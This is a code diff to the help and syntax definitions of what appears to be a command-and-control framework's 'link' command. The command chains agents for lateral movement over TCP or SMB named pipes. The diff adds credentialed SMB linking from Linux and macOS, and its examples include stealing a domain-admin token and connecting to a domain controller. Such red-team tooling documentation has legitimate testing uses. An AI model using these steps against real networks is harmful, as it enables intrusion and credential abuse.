@@ -1843,15 +1843,18 @@ os_compatibility = "all"
 description = "Link to a remote agent for lateral movement"
 syntax = """
 link <protocol> <target_host> [options]
-link smb <target_host> [pipe_name]    # Connect via SMB named pipe (Windows only)
-link tcp <target_host> [port]         # Connect via TCP socket (all platforms)
+link smb <target_host> [pipe_name]                           # SMB (Windows - uses token context)
+link smb <target_host> [pipe_name] <DOMAIN\\user> <password>  # SMB (Linux/Darwin - explicit creds)
+link tcp <target_host> [port]                                # TCP (all platforms)
 """
 examples = [
     "link tcp 192.168.1.100 4444",
     "link tcp 10.0.0.5 9999",
     "link tcp linux-server.internal",
     "link smb 192.168.1.50 spoolss",
-    "link smb dc01.corp.local netlogon"
+    "link smb dc01.corp.local netlogon",
+    "link smb 192.168.1.50 spoolss CORP\\\\admin SecretPass",
+    "link smb dc01 spoolss DOMAIN\\\\svc_account P@ssw0rd"
 ]
 help = """
 Connects to a link agent running on a remote host for lateral movement.
@@ -1862,7 +1865,7 @@ back to the server through the edge agent, creating a chain.
 
 PROTOCOLS:
   tcp    Connect via TCP socket - All platforms (Linux, Darwin, Windows)
-  smb    Connect via SMB named pipe (port 445) - Windows only
+  smb    Connect via SMB named pipe (port 445) - All platforms
 
 REQUIREMENTS:
 - The calling agent must be an HTTPS (edge) agent
@@ -1875,7 +1878,7 @@ TCP PORT:
 - TCP works across all platforms (Linux, macOS, Windows)
 - Uses HMAC-based authentication with pre-shared key (embedded at build time)
 
-SMB PIPE NAME (Windows only):
+SMB PIPE NAME:
 - If not specified, defaults to 'spoolss'
 - View configured pipe names in the Listeners panel (View > Show Listeners)
 - Common pipes: spoolss, netlogon, lsarpc, samr, browser
@@ -1889,14 +1892,27 @@ ARCHITECTURE:
   encrypted - the edge agent cannot read the link agent's traffic.
 
 AUTHENTICATION:
+
   TCP: Uses HMAC-based mutual authentication with a pre-shared key
   embedded at build time. No additional credential setup needed.
 
   SMB (Windows): Uses current security context. To connect with
   different credentials, first impersonate the appropriate token:
 
-  token steal 1234 domain-admin        # Steal domain admin token
-  link smb dc01.corp.local spoolss     # Connect as domain admin
+    token steal 1234 domain-admin        # Steal domain admin token
+    link smb dc01.corp.local spoolss     # Connect as domain admin
+
+  SMB (Linux/Darwin): Requires explicit credentials as arguments.
+  Credentials are passed directly to SMB authentication:
+
+    link smb <host> <pipe> <DOMAIN\\user> <password>
+
+    Example:
+    link smb 192.168.1.50 spoolss CORP\\admin SecretPass123
+    link smb dc01 netlogon DOMAIN\\svc_acct P@ssw0rd
+
+  If no credentials are provided on Linux/Darwin, anonymous
+  authentication is attempted (may fail if target requires auth).
 
 MULTI-HOP CHAINS:
   Link agents can themselves link to other link agents, creating
@@ -1910,9 +1926,13 @@ EXAMPLES:
   link tcp linux-server.internal 9999
   link tcp 10.0.0.5                     # Uses default port 4444
 
-  # Link to an SMB agent (Windows edge agent only)
+  # Link to an SMB agent (Windows - uses token context)
   link smb 192.168.1.50 spoolss
   link smb dc01.corp.local netlogon
+
+  # Link to an SMB agent (Linux/Darwin - with credentials)
+  link smb 192.168.1.50 spoolss CORP\\admin SecretPass
+  link smb dc01.corp.local netlogon DOMAIN\\svc_account P@ssw0rd
 
 TROUBLESHOOTING:
   TCP:
@@ -1924,6 +1944,7 @@ TROUBLESHOOTING:
   - "Access denied": Check credentials/token context
   - "Pipe not found": Verify link agent is running and pipe name matches
   - "Network path not found": Check target host is reachable
+  - "Auth failed" (Linux/Darwin): Verify DOMAIN\\user and password are correct
 """
 
 [commands.unlink]
